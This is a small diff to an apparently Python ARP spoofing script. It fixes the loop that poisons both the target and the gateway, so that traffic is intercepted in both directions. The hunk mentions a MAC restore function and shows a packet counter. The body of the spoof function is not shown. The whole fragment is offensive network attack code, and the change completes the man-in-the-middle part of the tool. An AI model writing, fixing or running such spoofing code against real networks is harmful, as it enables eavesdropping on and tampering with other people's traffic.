@@ -36,7 +36,7 @@ def restore_mac(dest_ip, source_ip):
 try:
     while True:
         spoof(target_ip, gateway_ip)
-        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packet_count = sent_packet_count + 2
         print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
         sys.stdout.flush()
